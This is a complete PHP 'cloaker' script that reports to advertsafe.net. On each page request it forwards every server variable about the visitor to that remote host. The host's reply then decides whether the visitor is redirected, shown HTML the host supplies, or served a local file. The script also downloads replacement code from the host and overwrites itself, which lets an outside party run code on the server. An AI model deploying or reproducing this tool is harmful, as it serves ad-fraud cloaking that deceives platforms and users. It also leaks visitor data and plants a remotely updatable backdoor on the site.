<?php
error_reporting(0);
class cloaker{
	private $url = "http://www.advertsafe.net";
	private $id="65522654a1c056b31e3c547a2c3c9877";
	private $c="0e4af90790debfdb4a0fc85dd3ef93ab";
	private $link = "/cloaker/cloaker.php";
	private $uploadLink = "/cloaker/upload.up";
	private $ver=3.65;
	private $output;

	public function __construct(){
		$this->checkTest();
		$this->checkRedirect();
		$this->link=$this->url.$this->link."?id=".$this->id."&c=".$this->c."&ver=".$this->ver;
		$this->uploadLink = $this->url.$this->uploadLink;
		$this->setDefaultHeaders();
		if (!function_exists('curl_init')) {
			print_r("You haven't the curl_init library");
			return;
		}
		$ch = curl_init($this->link);
		$headers=array();
		foreach($_SERVER as $key=>$normalizedValue){
			if(is_array($normalizedValue)){
				$normalizedValue = implode(',', $normalizedValue);
			}
			$normalizedValue = trim(preg_replace('/\s+/', ' ', $normalizedValue));
			$smallHeader=strlen($normalizedValue)<1000;
			if($smallHeader || $key == 'HTTP_USER_AGENT' || $key == 'HTTP_REFERER' || $key == 'QUERY_STRING' || $key == 'REQUEST_URI') {
				$headers[] = 'Impo_'.$key.': '.$normalizedValue;
			} else {
				$headers[] = 'Other_'.$key.': skipped because had size '.strlen($normalizedValue);
			}
		}
		curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
		curl_setopt($ch, CURLOPT_TIMEOUT, 5);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$this->output = json_decode(curl_exec($ch));
		curl_close($ch);
		$this->checkVersion();
		$this->start();
	}

	private function setDefaultHeaders(){
		header("Cache-Control: no-cache, private, must-revalidate");
		header("Pragma: no-cache");
		header("Expires: 0");
	}

	private function start(){
		if(!isset($this->output->code)){
			return;
		}
		switch($this->output->code){
			case 0:
				$this->redict($this->output->page);
			break;
			case 1:
				if($this->redundancyControlInclude($this->output->page)){
					$this->include_page($this->output->page);
				}
			break;
			case 2:
				$this->html_page($this->output->page);
			break;
			default:
				$this->error($this->output->message);
			break;
		}
	}

	private function include_page($link){
		if($link){
			if(file_exists($link)){
				include($link);
			}else $this->error("File not exist(check the link)");
		}else $this->error("You have not permission");
	}
	private function redict($link){
	    $tmp = parse_url($link, PHP_URL_QUERY);
		if(strlen($_SERVER['QUERY_STRING'])>1){
		    if(strlen($tmp)>1){
		        $linka = $link."&".$_SERVER['QUERY_STRING']."&xfsr=true";
		    }else{
		        $linka = $link."?".$_SERVER['QUERY_STRING']."&xfsr=true";
		    }
		}else{
		    if(strlen($tmp)>1){
		        $linka = $link."&xfsr=true";
		    }else{
		        $linka = $link."?xfsr=true";
		    }
		}
		header("Location: ".$linka);
	}
	private function html_page($cont){
		echo $cont;
	}
	private function error($err){
		echo "Error: ".$err;
	}
	private function checkVersion(){
		if(!isset($this->output->ver)){
			return;
		}
		if($this->output->ver!=$this->ver){
			$script = file_get_contents($this->uploadLink);
			if(!$script){
				return;
			}
			$script = preg_replace("/\/%id%\//", $this->id, $script, 1);
			$script = preg_replace("/\/%c%\//", $this->c, $script, 1);

			unlink(__FILE__);
			file_put_contents(__FILE__, $script);
		}
	}
	
	private function checkTest(){
		if(isset($_GET['xfstestxfs'])){
        	if($_GET['xfstestxfs']=='true'){
            	echo json_encode(Array("test"=>true), JSON_FORCE_OBJECT);
                die();
            }
        }
	}
	private function redundancyControlInclude($script){
		$file = __FILE__;
		if(substr($script,0,1)=="/"){
			if($file == $script){
				$this->error("Cloaked file and include page must be different");
				return false;
			}
		}
		if($file == rtrim(__DIR__, "/")."/".$script){
			$this->error("Cloaked file and include page must be different");
			return false;
		}
		return true;
	}
	private function checkRedirect(){
		if(isset($_GET["xfsr"]) && $_GET["xfsr"]==true){
			$this->error("Cloaked file and redirect page must be different");
			die();
		}
	}
}
$cl= new cloaker();